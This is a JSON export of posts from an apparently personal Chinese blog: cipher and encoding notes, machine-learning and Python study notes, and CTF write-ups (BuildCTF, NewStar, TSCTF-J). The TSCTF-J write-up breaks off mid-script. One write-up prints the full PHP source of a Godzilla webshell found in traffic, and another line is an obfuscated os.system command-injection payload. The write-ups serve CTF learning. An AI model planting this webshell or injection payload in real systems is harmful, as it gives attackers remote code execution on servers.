[{"content":"编码系列(持续更新) Base家族 Base16 使用16个ASCII可打印字符（数字0-9和字母A-F），对任意字节数据进行编码。 先获取输入字符串每个字节的二进制值（不足8比特在高位补0），然后将其串联进来，再按照4比特一组进行切分，将每组二进制数分别转换成十进制。 Base16编码后的数据量是原数据的两倍：1000比特数据需要250个字符（即 250*8=2000 比特）。 注： 可以看到8比特数据按照4比特切分刚好是两组，所以Base16不可能用到填充符号=。\n换句话说：Base16使用两个ASCII字符去编码原数据中的一个字节数据。\nBase16编码是一个标准的十六进制字符串（注意是字符串而不是数值），更易被人类和计算机使用，因为它并不包含任何控制字符，以及Base64和Base32中的=符号。\nBase32 Base32编码是使用32个可打印字符（字母A-Z和数字2-7）对任意字节数据进行编码的方案，编码后的字符串不用区分大小写并排除了容易混淆的字符，可以方便地由人类使用并由计算机处理。 Base32主要用于编码二进制数据，但是Base32也能够编码诸如ASCII之类的二进制文本。 Base32将任意字符串按照字节进行切分，并将每个字节对应的二进制值（不足8比特高位补0）串联起来，按照5比特一组进行切分，并将每组二进制值转换成十进制来对应32个可打印字符中的一个。 由于数据的二进制传输是按照8比特一组进行（即一个字节），因此Base32按5比特切分的二进制数据必须是40比特的倍数（5和8的最小公倍数）。\n例如输入单字节字符%，它对应的二进制值是100101，前面补两个0变成00100101（二进制值不足8比特的都要在高位加0直到8比特），从左侧开始按照5比特切分成两组：00100和101，后一组不足5比特，则在末尾填充0直到5比特，变成00100和10100，这两组二进制数分别转换成十进制数，通过上述表格即可找到其对应的可打印字符E和U，但是这里只用到两组共10比特，还差30比特达到40比特，按照5比特一组还需6组，则在末尾填充6个=。填充=符号的作用是方便一些程序的标准化运行，大多数情况下不添加也无关紧要，而且，在URL中使用时必须去掉=符号。\nBase64 Base64是一种基于64个可打印字符来表示二进制数据的表示方法。由于 $2^6=64$ ，所以每6个比特为一个单元，对应某个可打印字符。3个字节有24个比特，对应于4个Base64单元，即3个字节可由4个可打印字符来表示。 注：BinHex的版本使用不同的64字符集来代表6个二进制数字，但是不被称为Base64。\n如果要编码的字节数不能被3整除，最后会多出1个或2个字节，那么可以使用下面的方法进行处理：\n先使用0字节值在末尾补足，使其能够被3整除，然后再进行Base64的编码。 在编码后的Base64文本后加上一个或两个=号，代表补足的字节数。 也就是说：\n当最后剩余两个八位(待补足)字节（2个byte）时，最后一个6位的Base64字节块有四位是0值，最后附加上两个等号；\n如果最后剩余一个八位(待补足)字节（1个byte）时，最后一个6位的base字节块有两位是0值，最后附加一个等号。\nMD5 1 2 3 4 5 6 明文：admin 32位小写21232f297a57a5a743894a0e4a801fc3 32位大写21232F297A57A5A743894A0E4A801FC3 16位小写7a57a5a743894a0e 16位大写7A57A5A743894A0E Tips：十六位其实就是取32位的8-24位 MD5 加密后的密文应该是 纯数字+纯字符\nemoji-aes编码 emoji-aes使用对称aes加密密码加密字符串数据，然后用emojis替换Base64输出。 1 2 3 Message: flag Key: f@1g encryption: 🙃💵🌿🎤🚪🌏🐎🥋🚫😆😍🚫🌊📮🐘🖐🌉🥋✉🕹🎃☂🎤🎈🥋🐘✅🌪🕹🍌👌🎅🚨☃☀🕹🍵📂😆😍😁📂❓🗒 emoji-aes\n词频分析 一堆文字，看着什么编码都不像的，可能是词频分析，用在线网站跑\n字频分析 通常是给了一大段文字，然后用随波逐流分析就好\n摩斯电码 变种很多，直接用厨子跑就行\n维吉尼亚密码 一种典型的多表替换密码\n给了密文和Key\n直接拉到cyberchef中解密即可\n给了密文，没给密钥，但是知道目标明文的格式\n先用B神的脚本爆破出Key，然后再把这个Key放到cyberchef中解密\n根据对照表，手搓密钥的前几位\n希尔密码 解密网站\n已知密文和密钥，并且密钥(key)是一个网址，如http://www.verymuch.net\n已知密文和密钥，并且密钥是四个数字\n1 2 密文：exky 密钥：11 45 1 4 Rabbi密码 已知密文和密钥，密文有点像base64编码的(可能有+号)\n云隐密码 特征是：密文只由01248组成\n用随波逐流中的脚本直接跑\n社会主义核心价值观密码 解密网址\n公正民主公正文明公正和谐：abc\n盲文 使用在线翻译\n音乐符号 Tips：这里要注意，加密的密文一定是以=结尾的，有时候需要自己把=加上\n1 eg：♭♯♪‖¶♬♭♭♪♭‖‖♭♭♬‖♫♪‖♩♬‖♬♬♭♭♫‖♩♫‖♬♪♭♭♭‖¶∮‖‖‖‖♩♬‖♬♪‖♩♫♭♭♭♭♭§‖♩♩♭♭♫♭♭♭‖♬♭‖¶§♭♭♯‖♫∮‖♬¶‖¶∮‖♬♫‖♫♬‖♫♫§= 直接用在线网站解密\nPolybius密码（棋盘密码） CTFWiki上有详细介绍，如果给了一串数字但是用16进制出不来的话，可以试一下。\n埃特巴什码(Atbash) 类似于：(+w)v\u0026amp;LdG_FhgKhdFfhgahJfKcgcKdc_eeIJ_gFN\n拉入厨子直接解密\nDNA编码 使用CTFD中的DNAcode脚本解密，随波逐流里面也有。\nDecabit编码 正常的 Decabit编码 是十个字符一组的，如果不是十个一组，就很可能不是 Decabit编码\n1 +-+-++–+- ++—+-++- -+–++-++- +–++-++– –+++++— ++-++—+- +++-+-+— +-+-+—++ —+++-++- -+–++-++- -+–+++-+- -+–++-++- -+–++-++- ++-+-+-+– -+–+++-+- ++-++—+- -++++—+- -+–++-++- ++-+-+-+– +-+++—+- +++-++—- —+++-++- +-+-+—++ ++-+-+-+– +-+-+–++- ++–+–++- -++++—+- +—+++-+- ++-+-+-+– -++++—+- -+–+++-+- +–+-+-++- +++-+-+— +-+++—+- -+–+-+++- -+–++-++- —+++-++- ++++—-+- -++++—+- -+–+++-+- -+–++-++- —-+++++- 在线网站解。\n仿射密码 有两个key，key-a为必须是(1,3,5,7,9,11,15,17,19,21,23,25)中的一个,key-b是0~25的数字\n可以使用在线网站解。\nBrainFuck编码 随波逐流解。感觉和Decabit点像？\n1 +++++ +++[- \u0026gt;++++ ++++\u0026lt; ]\u0026gt;++. \u0026lt;++++ +++[- \u0026gt;++++ +++\u0026lt;] \u0026gt;++.\u0026lt; +++[- \u0026gt;---\u0026lt; ]\u0026gt;--- .+++. ----- ---.\u0026lt; +++++ [-\u0026gt;-- ---\u0026lt;] \u0026gt;---- ----. \u0026lt;++++ [-\u0026gt;++ ++\u0026lt;]\u0026gt; +.\u0026lt;++ +[-\u0026gt;- --\u0026lt;]\u0026gt; ----- .\u0026lt;+++ ++++[ -\u0026gt;+++ ++++\u0026lt; ]\u0026gt;+++ +.\u0026lt;++ +++++ [-\u0026gt;-- ----- \u0026lt;]\u0026gt;-- ----. \u0026lt;++++ +[-\u0026gt;+ ++++\u0026lt; ]\u0026gt;+++ +.\u0026lt;++ ++++[ -\u0026gt;--- ---\u0026lt;] \u0026gt;---- --.\u0026lt;+ ++[-\u0026gt; +++\u0026lt;] \u0026gt;+.\u0026lt;+ ++++[ -\u0026gt;+++ ++\u0026lt;]\u0026gt; +++++ .\u0026lt;+++ ++[-\u0026gt; ----- \u0026lt;]\u0026gt;-- -.\u0026lt;++ ++++[ -\u0026gt;+++ +++\u0026lt;] \u0026gt;++++ ++++. +++++ +++.\u0026lt; ++++[ -\u0026gt;--- -\u0026lt;]\u0026gt;- ----. \u0026lt;++++ [-\u0026gt;++ ++\u0026lt;]\u0026gt; .\u0026lt;+++ ++++[ -\u0026gt;--- ----\u0026lt; ]\u0026gt;--- ----- ----- -.++. .\u0026lt;+++ ++++[ -\u0026gt;+++ ++++\u0026lt; ]\u0026gt;+++ +++.+ ++.-. \u0026lt;+++[ -\u0026gt;--- \u0026lt;]\u0026gt;-- ----. \u0026lt;++++ ++[-\u0026gt; ----- -\u0026lt;]\u0026gt;- ----- ----. ++++. \u0026lt;++++ ++[-\u0026gt; +++++ +\u0026lt;]\u0026gt;+ +++++ .\u0026lt;+++ +++[- \u0026gt;---- --\u0026lt;]\u0026gt; ----- ---.\u0026lt; +++[- \u0026gt;+++\u0026lt; ]\u0026gt;+++ ++.\u0026lt;+ ++[-\u0026gt; ---\u0026lt;] \u0026gt;---. \u0026lt;++++ ++[-\u0026gt; +++++ +\u0026lt;]\u0026gt;. \u0026lt;++++ ++[-\u0026gt; +++++ +\u0026lt;]\u0026gt;. \u0026lt; Gronsfeld密码 没遇到过什么样的，但是在网上看到了，也没给示例，就贴了一个解密脚本。不懂什么意思。\n1 2 3 4 5 6 7 8 # 解密脚本 from pycipher import Gronsfeld cipher = \u0026#39;TGLBOMSJNSRAJAZDEZXGHSJNZWHG\u0026#39; key = [1,50,61,8,9,20,63,41] secret = Gronsfeld(key).decipher(cipher) print(secret) UUencode编码 AAencode编码 XXencode编码 上面三个统统拉到厨子里\nsnow隐写 空格和制表符组成的，并不是零宽字符，用snow解。\n零宽字符隐写 应该挺好看出来的，直接在线网站解就好了。\n文字盲水印 很明显的一个标志就是文本里有DEL删除符，用PuzzleSolver解。\n阴阳怪气 与佛论禅 与熊论道 天书奇谈 无字天书 中文电报（中文电码） Quote-Printable编码 类似于下面这样的编码，直接拉进厨子解。\n1 2 3 flag{ichunqiu_=E6=8A=80=E6=9C=AF=E6=9C=89=E6=B8=A9=E5=BA=A6} flag{ichunqiu_技术有温度} 中文ascii码 培根密码 由 a、b 或者 A、B 或者 0、1 组成的密文，密文中只有两种字符，可以直接使用 随波逐流 解密\nTips：CyberChef 的培根密码解密可能会有点问题，这里建议用随波逐流解密。\n锟斤拷 Notepad++里直接转成utf-8。\n键盘坐标密码 参考moectf-2024捂住一只耳。\n福尔摩斯密码 1 ·-· ·-· ·-· ·-· ·-· ·-· · 直接网上查找福尔摩斯密码对照表即可 flag{RRRRRRE}\n手机九宫格键盘密码 ","date":"2024-10-28T15:43:08+08:00","permalink":"https://XiaoYuan-420.gituhub.io/p/%E7%BC%96%E7%A0%81%E7%B3%BB%E5%88%97/","title":"编码系列"},{"content":"BuildCTF WP Misc部分 第一次和各位师傅把misc AK了，太强了，太有成就感了！感谢各位\nwhat is this? from binary得到\nccc,ppppp,ccppcp,p,cccc,cpppp,ccc,ccppcp,cpppp,ccccc,ccppcp,pp,ppppp,cpc,ccccc,c,ccppcp,pcpc,ppppp,pcc,c,ccppcp,pcpcpp,pcpcpp\n将c对应.，p 对应- 得到S0_TH1S_15_M0R5E_C0DE_!!\n别真给我开盒了哥 根据图片搜S3901找到视频\n知道是S3700高速，找一下旁边平行的铁路有津霸客运专线，也就是津保铁路\n如果再来一次，还会选择我吗？ 看一眼文件头和文件尾，是两个字节之间的交换\n1 2 3 4 5 6 7 8 9 10 with open(\u0026#34;password.png\u0026#34;, \u0026#39;rb\u0026#39;) as file: data = bytearray(file.read()) # 交换每两个相邻字节 for i in range(0, len(data) - 1, 2): data[i], data[i + 1] = data[i + 1], data[i] # 将修改后的数据写入新文件 with open(\u0026#34;output_file.png\u0026#34;, \u0026#39;wb\u0026#39;) as file: file.write(data) 得到解压密码：8!67adz6，在线网站直接扫条形码得到key:wo_bu_shi_xiao_hei_zi!!!，最后套好几次 Base64 解出 BuildCTF{y0u_are_great_boy}\n老色批 lsb隐写，提取Red0 Green0 Blue0按Row，LSBfirst得到 QnVpbGRDVEZ7MV9hbV9uMHRfTFNCISEhfQ== Base64解码一下得到flag BuildCTF{1_am_n0t_LSB!!!}\n一念愚即般若绝，一念智即般若生 阴阳怪气加密+与佛论禅+天书奇谈+Base58\nBuildCTF{D3crypt10n_1s_4_l0ng_r04d}\n四妹，你听我解释 winhex打开在文件末尾(IEND后)得到密文的前半段，crc爆破图片原有长宽得到密文后半段，组合起来核心价值观解密得到flag\n密文：自由文明法治平等公正敬业公正友善公正公正自由自由和谐平等自由自由公正法治友善平等公正诚信文明公正民主公正诚信平等平等诚信平等法治和谐公正平等平等友善敬业法治富强和谐民主法治诚信和谐\nBuildCTF{lao_se_p1}\n白白的真好看 flag1:打开doc文件，在字体样式中把隐藏文字关了，得到第一部分BuildCTF{Th3_wh1t3\nflag2:打开第1个txt文件，看到文件名00000000结合文档空白的内容联想到零宽隐写，在线网站得_y0u_s33\nflag3:扫描汉信码关注公众号回复雪得到snowsnow，结合第2个txt的文件名和内容中出现的许多空格和制表符，查到snow隐写，snowsnow为密钥，得_1s_n0t_wh1t3\n四妹？还是萍萍呢？ 二维码拼图，扫码得到林风云公众号。\nbinwalk检查图片，发现End of Zip archive，winhex打开后定位到对应的IDAT，在这个IDAT头部发现0304，是zip文件头的一半。将这个IDAT提取出来，补全文件头，发现压缩包里包含公众号回复password有惊喜.txt，发送后得到St7wg.。用密码解压，发现txt里是base64编码的png，转换后进行crc爆破，得到BuildCTF{PNG_@nd_H31Sh3nHu@}\n食不食油饼 文字盲水印PuzzleSolver提取，b64得到key:7gkjT!opo\nkey.jpg用WaterMarkH提取8GMdP3\nflag.txt \u0026gt; IJ2WS3DEINKEM62XMF2DG4SNMFZGWXZRONPVGMC7MVQVG6L5\nb32 \u0026gt; BuildCTF{Wat3rMark_1s_S0_eaSy}\nEZ_ZIP 1 2 3 4 import shutil for i in range(499,0,-1): shutil.unpack_archive(f\u0026#34;./layer_{i}.zip\u0026#34;, f\u0026#34;./\u0026#34;, \u0026#34;zip\u0026#34;) 有黑客！！！ 哥斯拉webshell流量，stream 11809中，解密返回payload。\nBuildctf{WireshArk_1s_vEry_Ez}\nstream 11809: /uploads/shell.php 哥斯拉\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i\u0026lt;strlen($D);$i++) { $c = $K[$i+1\u0026amp;15]; $D[$i] = $D[$i]^$c; } return $D; } $pass=\u0026#39;hhhhacker\u0026#39;; $payloadName=\u0026#39;payload\u0026#39;; $key=\u0026#39;73b761208d5c05f2\u0026#39;; if (isset($_POST[$pass])){ $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); //Encode payload with $key. if (strpos($payload,\u0026#34;getBasicsInfo\u0026#34;)===false){ $payload=encode($payload,$key); //Decode payload with $key. } eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); }else{ if (strpos($data,\u0026#34;getBasicsInfo\u0026#34;)!==false){ $_SESSION[$payloadName]=encode($data,$key); } } } 心算 __𝑖𝑚𝑝𝑜𝑟𝑡__(\u0026quot;\\157\\163\u0026quot;).𝑠𝑦𝑠𝑡𝑒𝑚(\u0026quot;\\143\\141\\164\\40\\146\\154\\141\\147\u0026quot;)\nGuesscoin nc连接容器，发现欢迎来到硬币猜测游戏!你需要猜100次,猜对60次才能获得flag。\n简单尝试一次，就通过了。\n恭喜你！你猜对了64次 欢迎拿到flag:\n我太喜欢亢金星君了！ 白图是分隔，黑图不用管\n-\u0026hellip; ..- .. .-.. -.. -.-. - ..-. \u0026mdash;-.\u0026ndash; .\u0026ndash; \u0026hellip;.- .\u0026mdash;- -.-. \u0026mdash; \u0026ndash; \u0026hellip;.- ..\u0026ndash;.- -. \u0026hellip;.- .\u0026ndash; ..\u0026ndash;.- ..-. .\u0026mdash;- \u0026hellip; \u0026hellip;. \u0026mdash;-.-\nBUILDCTFW41COM4_N4W_F1SH\nBlack\u0026amp;White 文件夹里有1089张纯黑/纯白的方形图片，猜测可以拼成33*33的二维码。\n使用python拼图，扫码得到 3I8XEDHUCJTARQFOEDX7D+08AC80T8N08Y6948DF2C43C9B6Z2，使用Base45解码，得到flag。\nBuildCTF{Tich1?pAnDa?_HahA_U_w1n}\nHEX的秘密 1 2 3 4 5 6 7 with open(\u0026#34;flag.txt\u0026#34;, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: flag = f.read() flag = [flag[i:i+2] for i in range(0, len(flag), 2)] flag = [hex(int(i, 16) ^ 0x80) for i in flag] print(\u0026#34;\u0026#34;.join(flag)) 得到0x420x750x690x6c0x640x430x540x460x7b0x330x450x7a0x7a0x5f0x410x350x630x210x210x5f0x620x690x6e0x610x720x790x790x790x7d\nfrom hex 得到 BuildCTF{3Ezz_A5c!!_binaryyy}\nFindYourWindows 用veracyrypt挂载，diskgenius恢复回收站里的文件找到flag.txt，得到BuildCTF{I2t_s0_e5sy!!!}\nE2_?_21P 将加密的两个标志位改成0，解压发现CRC校验失败，在010中将源数据区和目录区的压缩方法修改，BrainFuck解密得到BuildCTF{Da7A_Cowbr355lon_15_3A5Y}\n","date":"2024-10-24T22:35:40+08:00","permalink":"https://XiaoYuan-420.gituhub.io/p/buildctf-wp-misc%E9%83%A8%E5%88%86/","title":"BuildCTF WP Misc部分"},{"content":"Intro what is machine learning 让机器具备找一个函数的能力 语音识别 输入：声音信号\n输出：文字\n这个函数很复杂，人类无法编写出，让机器自己找到这个函数的过程便是机器学习\n图像识别 阿尔法狗 different types of function regression：输出为数值（scalar） classification：分类（classes） structured learning：创造 training 含参函数\n$y = b + wx_1$ -\u0026gt; Model -\u0026gt; Linear\n$x,y$ -\u0026gt; feature\n$w$ -\u0026gt; weight\n$b$ -\u0026gt; bias\nLoss\n$L(b, w)$ 来自于训练集\n$x_1$ -\u0026gt; $0.5k + 1x_1 = y$ -\u0026gt; $\\widehat{y}$ -\u0026gt; label\n$e_1 = |y - \\widehat{y}| \u0026hellip;$ -\u0026gt; Loss: $L = \\frac{1}{N}\\sum_{n}^N e_n$\n$e = |y - \\widehat{y}|$ -\u0026gt; MAE\n$e = (y - \\widehat{y})^2$ -\u0026gt; MSE\nIf $y$ and $\\widehat{y}$ are bath probability distributions -\u0026gt; Cross-entropy\nerror surface\noptimization\n$w^, b^ = arg \\min_{w, b}{L}$\ngradient descent\n随机选取 $w^0$ 计算 $w$ 对 $L$ 的微分在$w^0$处的值 斜率为负，增加 $w$ ；斜率为正，减小 $w$ 增大和减小的数值根据斜率和学习率来决定 hyperparameters $w^0$ -\u0026gt; $w^1$ -\u0026gt; \u0026hellip; 更新次数/$w^tt = 0$ 停止 global minima local minima evaluation\n","date":"2024-10-19T15:41:42+08:00","permalink":"https://XiaoYuan-420.gituhub.io/p/intro/","title":"Intro"},{"content":"NewStar 第一周 WP Misc decompress 附件是一个很多层的zip压缩包。一路点到最里面，得到一个hint和有加密的压缩包\nhint提示的是密码的正则表达式 ^([a-z]){3}\\d[a-z]$ 翻译一下，以3个小写字母打头+1个数字+1个小写字母结尾\nexp.py进行密码爆破\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import zipfile import itertools from string import ascii_lowercase zipfile_name = \u0026#39;decompressit.zip\u0026#39; zip_file = zipfile.ZipFile(zipfile_name, \u0026#39;r\u0026#39;) combinations = itertools.product(ascii_lowercase, repeat=3) for combination in combinations: password = \u0026#39;\u0026#39;.join(combination) for num in range(10): password += str(num) for letter in ascii_lowercase: password += letter print(f\u0026#34;try:{password}\u0026#34;) try: zip_file.extractall(pwd=password.encode()) print(f\u0026#39;Password found: {password}\u0026#39;) break except Exception: password = password[:-1] password = password[:-1] 得到密码xtr4m,然后用7-zip点开.zip.001得到true flagflag{U_R_th3_ma5ter_0f_dec0mpress}\n这里可以直接点.zip.001进行解压缩应该是7-zip的特性，如果进行和并的话需要进行合并\n1 copy /B 1.zip.001 + 1.zip.002 + 1.zip.003 1.zip 笔记区 正则表达式 常见的文件头识别和修复 pleasingMusic 拿到音乐一听，一眼丁真摩斯密码，正向得到. ..- --- .-.- -.--.. . ... .-. --- -- -.--.. ..-- .，结合题目提示反着来得到. --.. ..--.- -- --- .-. ... . ..--.- -.-. --- -.. .翻译一下ez_morse_code\nWhereIsFlag 虚拟机开Linux环境，nc链接题目环境，用ls慢慢搜就出来了。\nLabyrinth LSB隐写，用StegSolve在Red plane 0通道下看到了二维码，扫码得到flag{e33bb7a1-ac94-4d15-8ff7-fd8c88547b43}\n兑换码 png改宽高\n用010 Editor打开，在struct PNG_CHUNK chunk[0]下的struct PNG_CHUNK_IHDR ihdr下修改高度就可以看到flag文字。\nWeb headach3 用hackbar插件在请求头里加上doctor: true就行了。\n会赢吗 第一部分：按F12看源代码\n第二部分：在源代码里看到了revealFlag(className)函数，去控制台输入revealFlag(\u0026quot;4cqu1siti0n\u0026quot;)拿到flag\n第三部分：先看script里的代码，发现把\u0026lt;span id=\u0026quot;state\u0026quot;\u0026gt;标签内的文字改成解封，再按按钮就得到了。\n第四部分：有个\u0026lt;noscript\u0026gt;标签，禁用js后出现无量空处的bottom，单击得到最后一部分。\n","date":"2024-10-05T14:45:13+08:00","permalink":"https://XiaoYuan-420.gituhub.io/p/newstar-%E7%AC%AC%E4%B8%80%E5%91%A8-wp/","title":"NewStar 第一周 WP"},{"content":"Python基础知识 学前提醒 一定记得要自己动手编程试试哦~\nPython简介 语言特点:面向对象、解释型、高级计算机程序设计语言 ①面向对象：使用函数与类(在后面拓展中有讲)的方式编程解决问题 ②解释型：在运行时，首先要将每条语句进行检查编译成机器语言(即0与1)再进行自顶而下的运行 ③优缺点:编写容易但运行速度较慢 Python Shell：交互式解释器,输入一条执行一条,输入的语句不会被保存 编辑器：输入的语句不会立刻被执行，编写完成保存并运行时才会被执行 历史(课外阅读):Python从诞生至今经历了一次大的更新换代,即Python2到Python3的飞跃。由于Python2功能的不完善,运行速度慢，维护困难等缺点，Python的创始人在C语言的基础上重新设计了Python3,与原先Python2在语法上有较大的差异，而原先的Python 2也渐渐淡出了历史舞台.我们学习的也都是Python3的语法. 目前较稳定的Python版本:Python 3.8,Python3.9,Python3.10,Python3.12 笔者的环境是Python3.12.0 输入与输出语句 输入语句：input() 在括号内可以输入提示语 注意通过input()得到的是字符串 1 a = input(\u0026#34;请输入一串字符：\u0026#34;) # 输入123456 输出语句：print() 括号内可以传入多个要输出的值 注意：当出现运算符＋时，请一定当心加号两边的数据类型是否一致，该如何转化 1 print(a, type(a)) # type()用来查看a的数据类型 123456 \u0026lt;class 'str'\u0026gt; 数据类型 1 2 3 num1 = 123 # int类型 十进制 num2 = 0b100101 # int类型 二进制 num3 = 0x1a2b3c # int类型 十六进制 1 2 float1 = 1.0 # float类型 float2 = 1e5 # float类型 科学计数法 相当于 1.0*10^5 1 2 3 str1 = \u0026#34;I\u0026#39;m Li Hua\u0026#34; # str类型 由双引号引导 str2 = \u0026#39;He said:\u0026#34;I am not good.\u0026#34;\u0026#39; # str类型 由单引号引导 str3 = \u0026#39;\u0026#39;\u0026#39;That\u0026#39;s a desk\u0026#39;\u0026#39;\u0026#39; # str类型 由三引号引导 1 2 bool1 = True # bool类型 真值 bool2 = False # bool类型 假值 运算符与表达式 表达式:由数字、运算符、数字分组符号、自由变量和约束变量等以能求得数值的有意义排列方法所得的组合 运算符: 算术运算符\n注:若C=a%b, 当b\u0026gt;0时C∈[0,b) 当b\u0026lt;0时C∈(b,0]\n关系运算符\n注:链式比较 a\u0026lt;=b\u0026lt;=c ⇔ a\u0026lt;=b and b\u0026lt;=c\n逻辑运算符\n注:if not flag: ⇔ if flag==False:\n数据结构：（也是数据类型） 字符串（关于转义字符可转到“关于格式化输出”） 索引：从零开始的标号 索引取值 切片：格式：s[start:end:step] 1 2 3 4 5 6 7 8 9 s = \u0026#34;Hello,World\u0026#34; print(s[1]) try: print(s[11]) # 超出索引取值会报错 IndexError: string index out of range except IndexError as e: print(e) # 切片 s = \u0026#34;Hello,World\u0026#34; print(s[1:5]) e string index out of range ello 速会切片： 提示：若为负索引，将其加 len(s) 变为正索引 小技巧：\n①判断是否为空切片： 判断 (end-start) /step 是否大于 0(\u0026lt; 0为空)\n②切片中的元素个数（可用来检查）n=(end-start)//step\n列表 索引、切片与字符串相同 列表方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 l = [\u0026#34;A\u0026#34;, \u0026#34;B\u0026#34;, \u0026#34;C\u0026#34;] print(f\u0026#34;{l=}\u0026#34;) l.append(\u0026#34;D\u0026#34;) # 向列表末尾插入一位元素 print(f\u0026#34;{l=}\u0026#34;) l.insert(4, \u0026#34;E\u0026#34;) # 插入，第一个参数为索引，第二个参数为元素 print(f\u0026#34;{l=}\u0026#34;) # 超过列表长度会被加入到列表末尾,现在列表长度为5 l.insert(10, \u0026#34;F\u0026#34;) print(f\u0026#34;{l=}\u0026#34;) del_val = l.pop() # 当pop中不传入任何参数时，默认删除最后一个元素 print(f\u0026#34;{l=}, {del_val=}\u0026#34;) del_val = l.pop(3) # 删除指定索引上的元素，会返回被删除的元素 print(f\u0026#34;{l=}, {del_val=}\u0026#34;) l.remove(\u0026#34;E\u0026#34;) # 删除指定元素，若存在多个，删除第一个出现的该元素 # remove没有返回值 print(f\u0026#34;{l=}\u0026#34;) l=['A', 'B', 'C'] l=['A', 'B', 'C', 'D'] l=['A', 'B', 'C', 'D', 'E'] l=['A', 'B', 'C', 'D', 'E', 'F'] l=['A', 'B', 'C', 'D', 'E'], del_val='F' l=['A', 'B', 'C', 'E'], del_val='D' l=['A', 'B', 'C'] 字典（也叫哈希表(Hash Table)）\n键-值对(可以有相同的值)： {key1:valuel, key2:value2,\u0026hellip;}\n键：可以是字符串、元组、整型、浮点型 不能是列表、字典(它们是unhashable,不能被哈希化的) 值：可以是任何类型 取值：\u0026lt;字典名\u0026gt;[\u0026lt;键名\u0026gt;]\n键名不在字典中会引发KeyError 字典方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 d = {\u0026#34;A\u0026#34;: 10, \u0026#34;B\u0026#34;: 11, \u0026#34;C\u0026#34;:12} print(d.keys()) # 返回Keys对象,可迭代 print(\u0026#34;---------\u0026#34;) for key in d.keys(): print(key) print(\u0026#34;---------\u0026#34;) print(d.values()) # 返回Values对象,可迭代 print(\u0026#34;---------\u0026#34;) for val in d.values(): print(val) print(\u0026#34;---------\u0026#34;) print(d.items()) # 返回Items对象,可迭代 print(\u0026#34;---------\u0026#34;) for key, val in d.items(): print(key, val) print(\u0026#34;---------\u0026#34;) s = \u0026#34;1A\u0026#34; for i in s: # get方法，若键名不在字典中，返回第二个参数 print(d.get(i, int(i, 16))) dict_keys(['A', 'B', 'C']) --------- A B C --------- dict_values([10, 11, 12]) --------- 10 11 12 --------- dict_items([('A', 10), ('B', 11), ('C', 12)]) --------- A 10 B 11 C 12 --------- 1 10 算法结构 顺序结构 1 2 3 4 a = 1 a = 2 a = 3 print(f\u0026#34;{a=}\u0026#34;) a=3 分支结构(if语句)：\n所有的分支结构只会运行至多1个(可能不运行)\n循环结构：(for语句与while语句)\nwhile语句中注意循环控制变量的值一定要有初值且一定在循环中被改变 while True循环一定有break语句(该情况下True就是True,不能是等于True的其它变量) break语句:结束当前整个循环 continue语句:进入下一趟循环 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 for i in range(1, 3): if i == 2: break for j in range(1, 5): print((i,j), end=\u0026#34;\\t\u0026#34;) print() print(\u0026#34;---------\u0026#34;) for i in range(1, 5): for j in range(1, 11): if j == 2: break print((i,j), end=\u0026#34;\\t\u0026#34;) print() print(\u0026#34;---------\u0026#34;) for i in range(1, 4): if i == 2: continue for j in range(1, 3): print((i,j), end=\u0026#34;\\t\u0026#34;) print() print(\u0026#34;---------\u0026#34;) for i in range(1, 4): for j in range(1, 3): if j == 2: continue print((i,j), end=\u0026#34;\\t\u0026#34;) (1, 1)\t(1, 2)\t(1, 3)\t(1, 4)\t--------- (1, 1)\t(2, 1)\t(3, 1)\t(4, 1)\t--------- (1, 1)\t(1, 2)\t(3, 1)\t(3, 2)\t--------- (1, 1)\t(2, 1)\t(3, 1)\t","date":"2024-09-30T11:12:41+08:00","permalink":"https://XiaoYuan-420.gituhub.io/p/python%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","title":"Python基础知识"},{"content":"TSCTF-J XiaoYuan Writeup MISC set set password 单个数字之和必须等于 25，拿 1凑 罗马数字的乘积必须为 35，直接输 XXXV 验证码尽量刷出不含罗马数字和数字之和较小的 元素符号的拿 H凑 图寻直接一个国家一个国家试 密码长度拿空格凑和0凑（刚好满足闰年） 把系统时间设置成0:00避免25的问题 讲究一个暴力解决，说啥做啥，设置好密码就OK\nwordle 要赢100局肯定要找一个必胜策略，在开局的时候要尽可能的选择字母种数多的，而且字母的出现频率要高，可以排除更多的单词或确定更多的信息\n直接贴源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 import socket import random import json import time from collections import Counter with open(\u0026#34;5-letter-word.json\u0026#34;, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: word_list = json.load(f) # word_list = [word for word in word_list if len(word) == 5] # with open(\u0026#34;5-letter-word.json\u0026#34;, \u0026#34;w\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: # json.dump(word_list, f) def connect_to_wordle_server(): \u0026#34;\u0026#34;\u0026#34;连接到Wordle服务器\u0026#34;\u0026#34;\u0026#34; host = \u0026#39;challenges.hazmat.buptmerak.cn\u0026#39; port = 21473 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((host, port)) # 连接到服务器 return sock class WordleSovler(): def __init__(self, all_word): self.all_word 